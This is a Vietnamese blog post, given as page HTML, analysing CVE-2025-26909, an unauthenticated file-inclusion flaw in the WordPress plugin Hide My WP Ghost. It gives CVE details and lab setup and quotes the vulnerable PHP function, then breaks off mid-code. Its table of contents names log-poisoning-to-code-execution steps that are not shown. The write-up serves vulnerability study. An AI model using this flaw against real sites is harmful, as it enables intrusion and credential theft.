<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="vi">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>CVE-2025-26909 Analysis &amp; POC - Bui Van Y</title><meta name="author" content="Bui Van Y">
<meta name="description" content="Security Vulnerability in WordPress Hide My WP Ghost Plugin."><meta name="keywords" content='analyst, plugin, lfi'>
  <meta itemprop="name" content="CVE-2025-26909 Analysis & POC">
  <meta itemprop="description" content="Security Vulnerability in WordPress Hide My WP Ghost Plugin.">
  <meta itemprop="datePublished" content="2025-10-18T19:00:00+07:00">
  <meta itemprop="dateModified" content="2025-10-27T01:40:34+07:00">
  <meta itemprop="wordCount" content="2125">
  <meta itemprop="image" content="http://localhost:1313/posts/2025-10-18-cve-2025-26909/app.png">
  <meta itemprop="keywords" content="Analyst,Plugin,Lfi"><meta property="og:url" content="http://localhost:1313/vi/posts/2025-10-18-cve-2025-26909/">
  <meta property="og:site_name" content="Bui Van Y">
  <meta property="og:title" content="CVE-2025-26909 Analysis & POC">
  <meta property="og:description" content="Security Vulnerability in WordPress Hide My WP Ghost Plugin.">
  <meta property="og:locale" content="vi">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-10-18T19:00:00+07:00">
    <meta property="article:modified_time" content="2025-10-27T01:40:34+07:00">
    <meta property="article:tag" content="Analyst">
    <meta property="article:tag" content="Plugin">
    <meta property="article:tag" content="Lfi">
    <meta property="og:image" content="http://localhost:1313/posts/2025-10-18-cve-2025-26909/app.png">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/posts/2025-10-18-cve-2025-26909/app.png">
  <meta name="twitter:title" content="CVE-2025-26909 Analysis & POC">
  <meta name="twitter:description" content="Security Vulnerability in WordPress Hide My WP Ghost Plugin.">
<meta name="application-name" content="Bui Van Y">
<meta name="apple-mobile-web-app-title" content="Bui Van Y"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/svg-spinners--wind-toy.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/vi/posts/2025-10-18-cve-2025-26909/" title="CVE-2025-26909 Analysis &amp; POC - Bui Van Y" /><link rel="prev" type="text/html" href="http://localhost:1313/vi/posts/2025-10-17-cve-2025-39399/" title="CVE-2025-39399 Analysis &amp; POC" /><link rel="next" type="text/html" href="http://localhost:1313/vi/posts/2025-10-19-cve-2025-6715/" title="CVE-2025-6715 Analysis &amp; POC" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/vi/posts/2025-10-18-cve-2025-26909/index.md" title="CVE-2025-26909 Analysis & POC - Bui Van Y"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "CVE-2025-26909 Analysis \u0026 POC",
    "inLanguage": "vi",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http:\/\/localhost:1313\/vi\/posts\/2025-10-18-cve-2025-26909\/"
    },"image": ["http:\/\/localhost:1313\/images\/avatar.png"],"genre": "posts","keywords": "analyst, plugin, lfi","wordcount":  2125 ,
    "url": "http:\/\/localhost:1313\/vi\/posts\/2025-10-18-cve-2025-26909\/","datePublished": "2025-10-18T19:00:00+07:00","dateModified": "2025-10-27T01:40:34+07:00","publisher": {
      "@type": "Organization",
      "name": "/images/avatar.png","logo": "http:\/\/localhost:1313\/images\/avatar.png"},"author": {
        "@type": "Person",
        "name": "Bui Van Y"
      },"description": "Security Vulnerability in WordPress Hide My WP Ghost Plugin."
  }
  </script><script src="/js/head/color-scheme.min.js"></script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/vi/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="32" width="32"><span class="header-title-text">Bui Van Y</span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a class="menu-link" href="/vi/posts/"><i class="fa-solid fa-file-alt fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a class="menu-link" href="/vi/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a class="menu-link" href="/vi/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="Tìm tiêu đề hoặc nội dung..." id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Tìm kiếm">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Xoá">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" title="Đổi chủ đề">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li><li class="menu-item language-switch">
            <span role="button" aria-label="Chọn Ngôn ngữ" title="Chọn Ngôn ngữ"><i class="fa-solid fa-language fa-fw" aria-hidden="true"></i></span>
            <ul class="sub-menu"><li class="menu-item"><a href="/posts/2025-10-18-cve-2025-26909/" class="menu-link" title="English">English</a></li><li class="menu-item"><span class="text-secondary" title="Vietnamese">Vietnamese</span></li></ul>
          </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/vi/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="26" width="26"><span class="header-title-text">Bui Van Y</span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="Tìm tiêu đề hoặc nội dung..." id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Tìm kiếm">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Xoá">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              Huỷ
            </a>
          </li><li class="menu-item"><a class="menu-link" href="/vi/posts/"><i class="fa-solid fa-file-alt fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/vi/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/vi/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="Đổi chủ đề"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span><span class="menu-system-item language-switch">
              <span role="button" aria-label="Chọn Ngôn ngữ" title="Chọn Ngôn ngữ">Vietnamese<i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i></span>
              <select class="language-select" onchange="location = this.value;"><option value="/posts/2025-10-18-cve-2025-26909/">English</option><option value="/vi/posts/2025-10-18-cve-2025-26909/" selected disabled>Vietnamese</option></select>
            </span></li>
      </ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"><div class="details related-details open">
      <div class="details-summary related-summary">
        <i class="fa-solid fa-fire fa-fade text-danger fa-fw" aria-hidden="true"></i>
        <span class="related-title">Nội dung liên quan</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></div>
      <div class="details-content related-content">
        <ul class="related-list"><li class="related-item">
              <a href="/vi/posts/2025-10-20-cve-2025-52716/" title="CVE-2025-52716 Analysis &amp; POC">CVE-2025-52716 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-10-19-cve-2025-6715/" title="CVE-2025-6715 Analysis &amp; POC">CVE-2025-6715 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-10-17-cve-2025-39399/" title="CVE-2025-39399 Analysis &amp; POC">CVE-2025-39399 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-10-16-cve-2025-30782/" title="CVE-2025-30782 Analysis &amp; POC">CVE-2025-30782 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-10-15-cve-2025-30868/" title="CVE-2025-30868 Analysis &amp; POC">CVE-2025-30868 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-10-21-cve-2025-32141/" title="CVE-2025-32141 Analysis &amp; POC">CVE-2025-32141 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-10-14-cve-2025-32654/" title="CVE-2025-32654 Analysis &amp; POC">CVE-2025-32654 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-10-13-cve-2025-48293/" title="CVE-2025-48293 Analysis &amp; POC">CVE-2025-48293 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-10-12-cve-2025-53328/" title="CVE-2025-53328 Analysis &amp; POC">CVE-2025-53328 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-10-29-cve-2025-12136/" title="CVE-2025-12136 Analysis &amp; POC">CVE-2025-12136 Analysis &amp; POC</a></li></ul>
      </div>
    </div></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>CVE-2025-26909 Analysis &amp; POC</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><a href="github.com/w41bu1" title="Tác giả" rel=" author" class="author"><img class="avatar" src='/images/avatar.png' alt="Bui Van Y" height="16" width="16">&nbsp;Bui Van Y</a></span><span class="post-included-in">&nbsp;trong <a href="/vi/categories/cve-analyst/" class="post-category" title="Danh mục - CVE Analyst"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CVE Analyst</a></span></div><div class="post-meta-line"><span title="đăng ngày 2025-10-18 19:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-10-18">2025-10-18</time></span>&nbsp;<span title="Cập nhật ngày 2025-10-27 01:40:34"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden="true"></i><time datetime="2025-10-27">2025-10-27</time></span>&nbsp;<span title="2125 từ"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>Khoảng 2200 từ</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>10 phút</span>&nbsp;</div>
    </div><div class="featured-image"><img src='/posts/2025-10-18-cve-2025-26909/app.png' alt="/posts/2025-10-18-cve-2025-26909/app.png"></div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Nội dung</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#cve--basic-info">CVE &amp; Basic Info</a></li>
    <li><a href="#requirements">Requirements</a></li>
    <li><a href="#analysis">Analysis</a>
      <ul>
        <li><a href="#patch-diff">Patch diff</a></li>
        <li><a href="#vulnerable-code">Vulnerable Code</a></li>
      </ul>
    </li>
    <li><a href="#exploit">Exploit</a>
      <ul>
        <li><a href="#proof-of-concept-poc">Proof of Concept (PoC)</a></li>
        <li><a href="#log-poisoning--lfi--rce">Log poisoning → LFI → RCE</a>
          <ul>
            <li><a href="#step-1">Step 1</a></li>
            <li><a href="#step-2">Step 2</a></li>
          </ul>
        </li>
        <li><a href="#conclusion">Conclusion</a></li>
        <li><a href="#key-takeaways">Key takeaways</a></li>
      </ul>
    </li>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><h2 class="heading-element" id="cve--basic-info"><span>CVE &amp; Basic Info</span>
  <a href="#cve--basic-info" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Plugin <strong>Hide My WP Ghost</strong> phiên bản <strong>≤ 5.4.01</strong> chứa lỗ hổng <strong>Local File Inclusion</strong> cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh <code>include/require</code>, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã.</p>
<ul>
<li><strong>CVE ID</strong>: <a href="https://www.cve.org/CVERecord?id=CVE-2025-26909"target="_blank" rel="external nofollow noopener noreferrer">CVE-2025-26909</a></li>
<li><strong>Vulnerability Type</strong>: Local File Inclusion</li>
<li><strong>Affected Versions</strong>: &lt;= 5.4.01</li>
<li><strong>Patched Versions</strong>: 5.4.02</li>
<li><strong>CVSS severity</strong>: High (9.6)</li>
<li><strong>Required Privilege</strong>: Unauthenticated</li>
<li><strong>Product</strong>: <a href="https://wordpress.org/plugins/hide-my-wp/"target="_blank" rel="external nofollow noopener noreferrer">WordPress Hide My WP Ghost Plugin</a></li>
</ul>
<h2 class="heading-element" id="requirements"><span>Requirements</span>
  <a href="#requirements" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li><strong>Local WordPress &amp; Debugging</strong>: <a href="https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/"target="_blank" rel="external nofollow noopener noreferrer">Local WordPress and Debugging</a>.</li>
<li><strong>Plugin versions</strong> - <strong>Hide My WP Ghost</strong>: <strong>5.3.02</strong> (vulnerable) và <strong>5.4.02</strong> (patched).</li>
<li><strong>Diff tool</strong> - <a href="https://meldmerge.org/"target="_blank" rel="external nofollow noopener noreferrer"><strong>Meld</strong></a> hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.</li>
</ul>
<h2 class="heading-element" id="analysis"><span>Analysis</span>
  <a href="#analysis" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h3 class="heading-element" id="patch-diff"><span>Patch diff</span>
  <a href="#patch-diff" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p><strong>Bản lỗi</strong>:</p>
<div class="highlight" filename="Files.php v5.3.02"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="hl"><span class="lnt">44
</span></span><span class="lnt">45
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">getOriginalUrl</span><span class="p">(</span> <span class="nv">$url</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Build the rewrite rules if they are not already built
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_rewrites</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">buildRedirect</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Parse the URL components
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$parse_url</span> <span class="o">=</span> <span class="nx">wp_parse_url</span><span class="p">(</span> <span class="nv">$url</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Get the home root path
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$path</span> <span class="o">=</span> <span class="nx">wp_parse_url</span><span class="p">(</span> <span class="nx">home_url</span><span class="p">(),</span> <span class="nx">PHP_URL_PATH</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Backslash the paths
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="nv">$path</span> <span class="o">&lt;&gt;</span> <span class="s1">&#39;&#39;</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span> <span class="s1">&#39;/^&#39;</span> <span class="o">.</span> <span class="nx">preg_quote</span><span class="p">(</span> <span class="nv">$path</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span> <span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Replace paths to original based on rewrite rules
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_rewrites</span><span class="p">[</span><span class="s1">&#39;from&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_rewrites</span><span class="p">[</span><span class="s1">&#39;to&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_rewrites</span><span class="p">[</span><span class="s1">&#39;from&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_rewrites</span><span class="p">[</span><span class="s1">&#39;to&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_rewrites</span><span class="p">[</span><span class="s1">&#39;from&#39;</span><span class="p">],</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_rewrites</span><span class="p">[</span><span class="s1">&#39;to&#39;</span><span class="p">],</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">],</span> <span class="mi">1</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Default to https if the scheme is not set
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;https&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Reconstruct the URL
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;port&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;port&#39;</span><span class="p">]</span> <span class="o">&lt;&gt;</span> <span class="mi">80</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$new_url</span> <span class="o">=</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;://&#39;</span> <span class="o">.</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;:&#39;</span> <span class="o">.</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;port&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$path</span> <span class="o">.</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$new_url</span> <span class="o">=</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;://&#39;</span> <span class="o">.</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$path</span> <span class="o">.</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Append query string if present
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$query</span>   <span class="o">=</span> <span class="nv">$parse_url</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$query</span>   <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="k">array</span><span class="p">(</span> <span class="s1">&#39;?&#39;</span><span class="p">,</span> <span class="s1">&#39;%3F&#39;</span> <span class="p">),</span> <span class="s1">&#39;&amp;&#39;</span><span class="p">,</span> <span class="nv">$query</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$new_url</span> <span class="o">.=</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">strpos</span><span class="p">(</span> <span class="nv">$new_url</span><span class="p">,</span> <span class="s1">&#39;?&#39;</span> <span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;?&#39;</span> <span class="o">:</span> <span class="s1">&#39;&amp;&#39;</span> <span class="p">)</span> <span class="o">.</span> <span class="nv">$query</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
